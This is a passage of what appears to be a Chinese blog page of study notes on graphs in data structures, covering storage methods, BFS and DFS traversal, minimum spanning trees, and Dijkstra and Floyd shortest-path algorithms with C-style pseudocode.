常见考点：对于n个顶点的无向图G，若G是连通图，则最少有n-1条边。\\若G是非连通图，则最多可能有C_{n-1}^2条边\\对于有n个顶点的有向图G，若G是强连通图，则最少有n条边（形成回路）</script><h3 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803223621217.png" alt="image-20220803223621217"></p>
<h3 id="连通分量"><a href="#连通分量" class="headerlink" title="连通分量"></a>连通分量</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803223755599.png" alt="image-20220803223755599"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803223815794.png" alt="image-20220803223815794"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803223952245.png" alt="image-20220803223952245"></p>
<h3 id="生成树、森林"><a href="#生成树、森林" class="headerlink" title="生成树、森林"></a>生成树、森林</h3><p>连通图的生成树是包含图中全部顶点的一个极小连通子图<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803224238846.png" alt="image-20220803224238846"><br>n个顶点应该有n-1条边<br>在非连通图中，连通分量的生成树构成了非连通图的生成森林<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803224538347.png" alt="image-20220803224538347"></p>
<h3 id="边的权、带权图-网"><a href="#边的权、带权图-网" class="headerlink" title="边的权、带权图/网"></a>边的权、带权图/网</h3><p>边的权：每条边都可以标上具用某种含义的数值，该数值称为该边的<strong>权值</strong>。<br>带权图/网：边上带有权值的图称为<strong>带权图</strong>，也称<strong>网</strong><br>带权路径长度：当图是带权图时，一条<strong>路径上所有边的权值之和</strong></p>
<h3 id="特殊形态的图"><a href="#特殊形态的图" class="headerlink" title="特殊形态的图"></a>特殊形态的图</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803225437195.png" alt="image-20220803225437195"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803225522718.png" alt="image-20220803225522718"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803225858050.png" alt="image-20220803225858050"><br>树是连通图，有向树并不是强连通图</p>
<h2 id="邻接矩阵法"><a href="#邻接矩阵法" class="headerlink" title="邻接矩阵法"></a>邻接矩阵法</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806130207218.png" alt="image-20220806130207218"><br>有向图：出度为行中1的个数  入度为列中1的个数 。矩阵是行-&gt;列</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxVertexNum 100                      <span class="comment">//顶点数目最大值</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span> </span><br><span class="line">    <span class="type">char</span> Vex[MaxVertexNum];                   <span class="comment">//顶点表</span></span><br><span class="line">    <span class="type">int</span> Edge[MaxVertexNum][MaxVertexNum];     <span class="comment">//邻接矩阵、边表  //因为数据为0，1，可以换为bool型</span></span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;                        <span class="comment">//图当前的顶点数和边数/弧数</span></span><br><span class="line">&#125; MGraph</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806130727614.png" alt="image-20220806130727614"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806131031260.png" alt="image-20220806131031260"><br>使用宏定义常量表示无穷   #define INFINITY</p>
<h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><script type="math/tex; mode=display">
在n个顶点的图中，空间复杂度为O(n)+O(n^2)=O(|v|^2),|v|为顶点集的个数\\
所以空间复杂度与边数没有关系，更适合用于存储稠密图，因为无向图的邻接矩阵是对称矩阵，所以可以压缩为上三角矩阵进行存储</script><h3 id="性质-1"><a href="#性质-1" class="headerlink" title="性质"></a>性质</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806131810061.png" alt="image-20220806131810061"></p>
<h2 id="邻接表法"><a href="#邻接表法" class="headerlink" title="邻接表法"></a>邻接表法</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806134053572.png" alt="image-20220806134053572"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//邻接表存储的图（顺序存储） </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    AdjList vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125; ALGraph;</span><br><span class="line"><span class="comment">//顶点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span>&#123;</span></span><br><span class="line">	VertexType data;               <span class="comment">//顶点信息</span></span><br><span class="line">    ArcNode *first;                <span class="comment">//第一条边</span></span><br><span class="line">&#125;VNode,AdjList[MaxVertexNum];</span><br><span class="line"><span class="comment">//边</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> adjvex;                    <span class="comment">//边指向的结点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> *<span class="title">next</span>;</span>           <span class="comment">//指向下一条边的指针</span></span><br><span class="line">    <span class="comment">//InfoType info;                //边权值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无向图边结点数量是2|E|，整体空间复杂度为O(|V|+2|E|)<br>有向图边结点数量是|E|，整体空间复杂度为O(|V|+|E|)<br>邻接表存储稀疏图<br>出度：遍历目标结点的链表<br>入度：遍历整个链表寻找指向目标结点的个数</p>
<h2 id="十字链表、邻接多重表"><a href="#十字链表、邻接多重表" class="headerlink" title="十字链表、邻接多重表"></a>十字链表、邻接多重表</h2><p>十字链表用于存储有向图<br>邻接多重表存储无向图</p>
<h3 id="十字链表"><a href="#十字链表" class="headerlink" title="十字链表"></a>十字链表<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806140152515.png" alt="image-20220806140152515"></h3><h3 id="邻接多重表"><a href="#邻接多重表" class="headerlink" title="邻接多重表"></a>邻接多重表</h3><p>邻接表存储无向图：每条边对于两份冗余数据，删除，删除顶点、边不方便<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806140736457.png" alt="image-20220806140736457"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806140750826.png" alt="image-20220806140750826"><br>空间复杂度：O(|V|+|E|)</p>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806141213425.png" alt="image-20220806141213425"></p>
<h2 id="图的基本操作"><a href="#图的基本操作" class="headerlink" title="图的基本操作"></a>图的基本操作</h2><h3 id="Adjacent-G-x-y"><a href="#Adjacent-G-x-y" class="headerlink" title="Adjacent(G,x,y)"></a>Adjacent(G,x,y)</h3><p>判断图G是否存在边<x,y>(x,y)<br>该操作邻接矩阵更合适</x,y></p>
<h3 id="Neighbors-G-x"><a href="#Neighbors-G-x" class="headerlink" title="Neighbors(G,x)"></a>Neighbors(G,x)</h3><p>列出图G与结点x邻接的边<br>该操作一般情况下邻接矩阵更合适</p>
<h3 id="InsertVertex-G-x"><a href="#InsertVertex-G-x" class="headerlink" title="InsertVertex(G,x)"></a>InsertVertex(G,x)</h3><p>在图G中插入顶点x<br>在邻接矩阵和邻接表中都是在最后插入新的数据</p>
<h3 id="DeleteVertex-G-x"><a href="#DeleteVertex-G-x" class="headerlink" title="DeleteVertex(G,x)"></a>DeleteVertex(G,x)</h3><p>从图G中删除顶点x<br>邻接矩阵：删除一个顶点之后，将对应的行和列重置为0，可以设置一个bool变量表示是一个空结点</p>
<h3 id="AddEdge-G-x-y"><a href="#AddEdge-G-x-y" class="headerlink" title="AddEdge(G,x,y)"></a>AddEdge(G,x,y)</h3><p>若无向边（x,y)或者有向边<x,y>不存在，则向图G中添加该边<br>邻接表可以使用头插法，时间复杂度为O(1)</x,y></p>
<h3 id="FirstNeighbor-G-x"><a href="#FirstNeighbor-G-x" class="headerlink" title="FirstNeighbor(G,x)"></a>FirstNeighbor(G,x)</h3><p>求图G中顶点x的第一个邻接点，若有则返回顶点号，没有返回-1</p>
<h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><h3 id="广度优先遍历-BFS"><a href="#广度优先遍历-BFS" class="headerlink" title="广度优先遍历(BFS)"></a>广度优先遍历(BFS)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> visited[max_vertex_num];            <span class="comment">//访问标记数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vernuml;++i)</span><br><span class="line">        visited[i]=<span class="literal">false</span>;                <span class="comment">//访问标记数组初始化</span></span><br><span class="line">    InitQueue(Q);                        <span class="comment">//初始化辅助队列Q</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)              <span class="comment">//从0号顶点开始遍历</span></span><br><span class="line">        <span class="keyword">if</span>(!visited[i])                  <span class="comment">//对每个连通分量调用BFS</span></span><br><span class="line">            BFS(G,i);                    <span class="comment">//vi未访问过，从vi开始BFS</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;                 <span class="comment">//从顶点v出发，广度优先遍历图G</span></span><br><span class="line">    visit(v);                            <span class="comment">//访问初始节点</span></span><br><span class="line">    visited[v]=<span class="literal">true</span>;                     <span class="comment">//对顶点v做访问标记</span></span><br><span class="line">    Enqueue(Q,v);                        <span class="comment">//顶点v入队列Q</span></span><br><span class="line">    <span class="keyword">while</span>(!isEmpty(Q))&#123;</span><br><span class="line">        DeQueue(Q,v);                    <span class="comment">//顶点v出队</span></span><br><span class="line">        <span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,v,w))</span><br><span class="line">            <span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">                visit(w);                <span class="comment">//w为v的尚未访问的邻接顶点</span></span><br><span class="line">                visited[w]=<span class="literal">true</span>;</span><br><span class="line">                EnQueue(Q,w);</span><br><span class="line">            &#125;<span class="comment">//if</span></span><br><span class="line">    &#125;<span class="comment">//while</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于无向图，调用BFS函数的次数=连通分量次数</p>
<script type="math/tex; mode=display">
邻接矩阵存储的图，时间复杂度是O(|V|^2)\\
邻接表的广度优先遍历时间复杂度是O(|V|+|E|)</script><p>广度优先生成树，邻接矩阵生成的树是唯一的，邻接表生成的树不一定是唯一的</p>
<h3 id="深度优先遍历-DFS"><a href="#深度优先遍历-DFS" class="headerlink" title="深度优先遍历(DFS)"></a>深度优先遍历(DFS)</h3><p>visited数组防止重复访问</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220817160208534.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> visited[MAX_VERTEX_NUM];   <span class="comment">//访问标记数组</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)</span><br><span class="line">        visited[v]=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[v])</span><br><span class="line">            DFS(G,v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">    visit(v);</span><br><span class="line">    visited[v]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighor(G,v,w))</span><br><span class="line">        <span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">            DFS(G,w);</span><br><span class="line">        &#125;  <span class="comment">//if</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822104847638.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111010384.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111023324.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111113241.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111143570.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111202426.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111218447.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111235582.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111255969.png" alt></p>
<p>空间复杂度：来自于递归调用，最坏是O(|V|)，最好是O(1)<br>时间复杂度：邻接矩阵——O(|V|^2)<br>                     邻接表——O(|V|+|E|)</p>
<p>注意处理非连通图（即使用一层for循环遍历图，通过visited数组判断是否已经遍历完成）</p>
<h3 id="广度优先和深度优先的对比"><a href="#广度优先和深度优先的对比" class="headerlink" title="广度优先和深度优先的对比"></a>广度优先和深度优先的对比</h3><p>广度优先使用的是队列，在BFS函数中通过while循环将一层一层入队元素<br>深度优先使用的是栈，在DFS函数中通过递归调用实现将一条路走到底</p>
<p>两种算法的复杂度是一样的，主要是看图的存储方式<br>注：邻接表不一样，得到的深度或者广度优先遍历序列不一样</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822113501088.png" alt><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822113548936.png" alt="image-20220822113548936"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822113606400.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822113614038.png" alt></p>
<h2 id="最小生成树-MST"><a href="#最小生成树-MST" class="headerlink" title="最小生成树(MST)"></a>最小生成树(MST)</h2><p>最小生成树可能有多个，但边的权值之和总是唯一且最小的<br>最小生成树的边数=顶点数-1<br>只有连通图才有生成树，非连通图只有生成森林</p>
<h3 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h3><p>从某一个顶点开始构建生成树；每次将代价最小的新顶点纳入生成树，直到所有的顶点都纳入为止</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822144757688.png" alt><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822144926520.png" style="zoom:80%;"></p>
<h3 id="Kruskal算法"><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h3><p>每次挑选一条权值最小的便，使这条边两头连通(原本已经连通的就不选)，直到所有结点都联通<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822145315769.png" style="zoom:80%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822145256226.png" style="zoom: 80%;"></p>
<h3 id="Prim算法与Kruskal算法"><a href="#Prim算法与Kruskal算法" class="headerlink" title="Prim算法与Kruskal算法"></a>Prim算法与Kruskal算法</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822145611660.png" alt></p>
<h3 id="Prim算法的实现思想"><a href="#Prim算法的实现思想" class="headerlink" title="Prim算法的实现思想"></a>Prim算法的实现思想</h3><p>初始化<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822145817443.png" alt><br>循环遍历所有结点，找到lowcast最低的，且还没加入树的顶点。再次循环遍历，更新还没加入的各个顶点的lowcast值<br>从V0开始，总共需要n-1轮循环，每一轮的时间复杂度O(2n)，所以总时间复杂度为(n-1)O(2n)=O(n^2)，即O(|V|^2)</p>
<h3 id="Kruskal算法的实现思想"><a href="#Kruskal算法的实现思想" class="headerlink" title="Kruskal算法的实现思想"></a>Kruskal算法的实现思想</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822150435335.png" alt><br>检查第一条边的两个顶点是都连通（是否属于同一个集合)————实现方法：并查集<br>检查第二条边的两个顶点是都连通（是否属于同一个集合)<br>检查第三条边的两个顶点是都连通（是否属于同一个集合)<br>·······<br>检查最后一条边的两个顶点是都连通（是否属于同一个集合)</p>
<script type="math/tex; mode=display">
共执行e轮，每轮判断两个顶点是否属于同一集合，需要O(log_2e)，所以总时间复杂度为O(elog_2e)</script><p>——————《算法导论》</p>
<h2 id="最短路径问题——BFS算法"><a href="#最短路径问题——BFS算法" class="headerlink" title="最短路径问题——BFS算法"></a>最短路径问题——BFS算法</h2><h3 id="BFS求无权图的单源最短路径"><a href="#BFS求无权图的单源最短路径" class="headerlink" title="BFS求无权图的单源最短路径"></a>BFS求无权图的单源最短路径</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFS_Distance</span><span class="params">(Graph G,<span class="type">int</span> u)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i) &#123;</span><br><span class="line">        d[i]=∞;  <span class="comment">//d[i]表示从u到i的最短路径，初始化路径长度</span></span><br><span class="line">        path[i]=<span class="number">-1</span>;  <span class="comment">//最短路径从哪个顶点过来</span></span><br><span class="line">    &#125;</span><br><span class="line">    d[u]=<span class="number">0</span>;</span><br><span class="line">    visited[u]=<span class="literal">true</span>;</span><br><span class="line">    EnQueue(Q,u);</span><br><span class="line">    <span class="keyword">while</span>(!isEmpty(Q)) &#123;		<span class="comment">//BFS算法主过程</span></span><br><span class="line">        DeQueue(Q,u);            <span class="comment">//队头元素出队</span></span><br><span class="line">        <span class="keyword">for</span>(w=FristNeighbor(G,u);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,u,w))</span><br><span class="line">            <span class="keyword">if</span>(!visited[w]) &#123;         <span class="comment">//w为u尚未访问的邻接结点</span></span><br><span class="line">                d[w]=d[u]+<span class="number">1</span>;       <span class="comment">//路径长度+1</span></span><br><span class="line">                path[w]=u;         <span class="comment">//最短路径从u到w</span></span><br><span class="line">                visited[w]=<span class="literal">true</span>;   <span class="comment">//设置已访问标记</span></span><br><span class="line">                EnQueue(Q,w);      <span class="comment">//顶点w入队</span></span><br><span class="line">            &#125; <span class="comment">//if</span></span><br><span class="line">    &#125; <span class="comment">//while</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822152400138.png" alt></p>
<p>算法过程：</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153144597.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153238514.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153332062.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153402310.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153436902.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153514478.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153522102.png" alt></p>
<h2 id="最短路径算法——Dijkstra算法"><a href="#最短路径算法——Dijkstra算法" class="headerlink" title="最短路径算法——Dijkstra算法"></a>最短路径算法——Dijkstra算法</h2><p>BFS算法求单源最短路径只适用于无权图，或所有边的权值都相同的图</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822155010006.png" alt></p>
<p>循环遍历所有节点，找到还没确定最短路径且dist最小的顶点Vi，另final[i]=true,检查所有邻接自Vi的顶点，若其final值为false，则更新dist和path</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822155437661.png" style="zoom:80%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822155614936.png" style="zoom:80%;"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822160001351.png" style="zoom:80%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822160016525.png" style="zoom:80%;"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822155802078.png" alt></p>
<script type="math/tex; mode=display">
伪代码实现：\\
初始：若从V_0开始，令final[0]=true;dist[0]=0;path[0]=-1。\\
其余顶点final[k]=false;dist[k]=arcs[0][k];path[k]=(arcs[0][k]==∞)?-1:0\\
n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且dist最小的顶点V_i，令final[i]=true。\\
并检查所有邻接自V_i的顶点，对于邻接自V_i的顶点V_j,若final[j]==false且dist[i]+arcs[i][j]<dist[j]\\
则令dist[j]=dist[i]+arcs[i][j];path[j]=i.(注：arcs[i][j]表示V_i到V_j的弧的权值)\\
时间复杂度：O(n^2)即O(|V|^2)</script><p>注意：Dijkstra算法不适用于有负权值的带权图</p>
<h2 id="最短路径问题——Floyd算法"><a href="#最短路径问题——Floyd算法" class="headerlink" title="最短路径问题——Floyd算法"></a>最短路径问题——Floyd算法</h2><p>使用动态规划思想，将问题的求解分为多个阶段</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822162139905-16611676211511.png" alt></p>
<script type="math/tex; mode=display">
若允许在V_k进行中转\\
若A^{(k-1)}[i][j]>A^{k-1}[i][k]+A^{(k-1)}[k][j]\\
则A^{(k)}[i][j]=A^{(k-1)}[i][k]+A^{(k-1)}[k][j]\\
path^{(k)}[i][j]=k\\
否则A^{(k)}和path^{(k)}保持原值</script><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822163032743-16611676211512.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822163208295-16611676211513.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822163313451-16611676211514.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822163320676-16611676211515.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//准备工作，初始化矩阵A(即邻接矩阵)和矩阵path</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++) &#123;    <span class="comment">//考虑以Vk作为中转点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;    <span class="comment">//遍历整个矩阵</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i][j]&gt;A[i][k]+A[k][j])&#123;     <span class="comment">//以Vk作为中转点的路径更短</span></span><br><span class="line">                A[i][j]=A[i][k]+A[k][j];     <span class="comment">//更新最短路径长度</span></span><br><span class="line">                path[i][j]=k;                <span class="comment">//中转点</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
时间复杂度：O(|V|^3)\\
空间复杂度：O(|V|^2)</script><h4 id="Floyd算法实例"><a href="#Floyd算法实例" class="headerlink" title="Floyd算法实例"></a>Floyd算法实例</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822164622091-16611676211516.png" alt><br>初始状态<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822164556099.png" alt><br>允许V0中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822164535721.png" alt><br>允许V1中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822164803197.png" alt><br>允许V2中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822165126097.png" alt></p>
<script type="math/tex; mode=display">
注意其中A[0][3]通过A[2]中转时:\\
A[0][3]=A[0][2]+A[2][3]已经考虑到了V_0->V_2->V_1->V_3的路程</script><p>允许V3中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822165455969-166116762115211.png" alt><br>允许V4中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822165812367.png" alt></p>
<h4 id="如何通过path矩阵寻找最短路径"><a href="#如何通过path矩阵寻找最短路径" class="headerlink" title="如何通过path矩阵寻找最短路径"></a>如何通过path矩阵寻找最短路径</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822165717520-166116762115213.png" alt></h4><p>弗洛伊德算法可以用于负权值带权图，但无法解决带有负权回路的图，这种图可能没有最短路径，如：<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822170209802-166116762115215.png" alt></p>
